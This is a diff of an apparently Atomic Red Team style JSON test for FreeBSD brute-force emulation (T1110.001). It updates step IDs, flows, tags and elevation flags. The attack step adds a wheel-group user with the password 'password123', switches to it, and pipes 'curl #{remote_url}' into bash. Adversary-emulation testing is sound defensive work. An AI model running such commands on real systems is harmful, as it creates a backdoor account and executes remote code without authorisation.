@@ -7,25 +7,25 @@
   ],
   "steps": [
     {
-      "id": "8a621284-b84f-44e2-bb68-146b9c3d580d",
+      "id": "b01f0cf3-35e9-40f4-9bac-c5ab8633a540",
       "type": "execute-command",
       "data": {
         "command": "pw adduser art -g wheel -s /bin/sh\necho \"password123\" | pw usermod art -h 0\nsu art\ncd /tmp\ncurl -s #{remote_url} |bash\n",
         "command_type": "bash"
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "1ecc3a93-2e65-4b01-af15-9187e8d465f2",
+      "id": "73b4bc26-1d7a-426d-bbd9-f88ee84926e7",
       "type": "execute-command",
       "data": {
         "command": "rmuser -y art\n",
         "command_type": "bash"
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "87b93290-9e4d-47d9-a563-8523bbfb0366",
+      "id": "201c5dc2-c8cd-4208-aee6-bfa9b7290578",
       "name": "Check dependency 1/1",
       "description": "Check if running on a FreeBSD based machine.\n",
       "type": "execute-command",
@@ -33,10 +33,10 @@
         "command": "if grep -iq \"FreeBSD\" /etc/os-release; then echo \"FreeBSD\"; else echo \"NOT FreeBSD\"; exit 1; fi\nif [ -x \"$(command -v openssl)\" ]; then echo \"openssl is installed\"; else echo \"openssl is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v sudo)\" ]; then echo \"sudo is installed\"; else echo \"sudo is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v bash)\" ]; then echo \"bash is installed\"; else echo \"bash is NOT installed\"; exit 1; fi\n",
         "command_type": ""
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "6f94beba-d324-4ffc-9597-725fe3a62ac8",
+      "id": "1674af3e-edd5-4a8a-804a-3470b4d1f289",
       "name": "Resolve dependency 1/1",
       "description": "Check if running on a FreeBSD based machine.\n",
       "type": "execute-command",
@@ -44,10 +44,10 @@
         "command": "pkg update \u0026\u0026 pkg install -y sudo curl bash\n",
         "command_type": ""
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "3353e52c-5e21-4970-a4fa-b24e31ca9948",
+      "id": "ec8080a0-c634-4447-ab19-7d2ecce605bb",
       "name": "Re-check dependency 1/1",
       "description": "Check if running on a FreeBSD based machine.\n",
       "type": "execute-command",
@@ -55,44 +55,44 @@
         "command": "if grep -iq \"FreeBSD\" /etc/os-release; then echo \"FreeBSD\"; else echo \"NOT FreeBSD\"; exit 1; fi\nif [ -x \"$(command -v openssl)\" ]; then echo \"openssl is installed\"; else echo \"openssl is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v sudo)\" ]; then echo \"sudo is installed\"; else echo \"sudo is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v bash)\" ]; then echo \"bash is installed\"; else echo \"bash is NOT installed\"; exit 1; fi\n",
         "command_type": ""
       },
-      "elevation_required": false
+      "elevation_required": true
     }
   ],
   "flows": [
     {
-      "s": "8a621284-b84f-44e2-bb68-146b9c3d580d",
+      "s": "b01f0cf3-35e9-40f4-9bac-c5ab8633a540",
       "p": "on-success",
-      "o": "1ecc3a93-2e65-4b01-af15-9187e8d465f2"
+      "o": "73b4bc26-1d7a-426d-bbd9-f88ee84926e7"
     },
     {
-      "s": "8a621284-b84f-44e2-bb68-146b9c3d580d",
+      "s": "b01f0cf3-35e9-40f4-9bac-c5ab8633a540",
       "p": "on-failure",
-      "o": "1ecc3a93-2e65-4b01-af15-9187e8d465f2"
+      "o": "73b4bc26-1d7a-426d-bbd9-f88ee84926e7"
     },
     {
-      "s": "87b93290-9e4d-47d9-a563-8523bbfb0366",
+      "s": "201c5dc2-c8cd-4208-aee6-bfa9b7290578",
       "p": "on-success",
-      "o": "8a621284-b84f-44e2-bb68-146b9c3d580d"
+      "o": "b01f0cf3-35e9-40f4-9bac-c5ab8633a540"
     },
     {
-      "s": "87b93290-9e4d-47d9-a563-8523bbfb0366",
+      "s": "201c5dc2-c8cd-4208-aee6-bfa9b7290578",
       "p": "on-failure",
-      "o": "6f94beba-d324-4ffc-9597-725fe3a62ac8"
+      "o": "1674af3e-edd5-4a8a-804a-3470b4d1f289"
     },
     {
-      "s": "6f94beba-d324-4ffc-9597-725fe3a62ac8",
+      "s": "1674af3e-edd5-4a8a-804a-3470b4d1f289",
       "p": "on-success",
-      "o": "3353e52c-5e21-4970-a4fa-b24e31ca9948"
+      "o": "ec8080a0-c634-4447-ab19-7d2ecce605bb"
     },
     {
-      "s": "3353e52c-5e21-4970-a4fa-b24e31ca9948",
+      "s": "ec8080a0-c634-4447-ab19-7d2ecce605bb",
       "p": "on-failure",
-      "o": "8a621284-b84f-44e2-bb68-146b9c3d580d"
+      "o": "b01f0cf3-35e9-40f4-9bac-c5ab8633a540"
     }
   ],
   "tags": [
-    "T1110.001",
-    "atomic-red-team"
+    "T1110",
+    "T1110.001"
   ],
   "input_arguments": [
     {
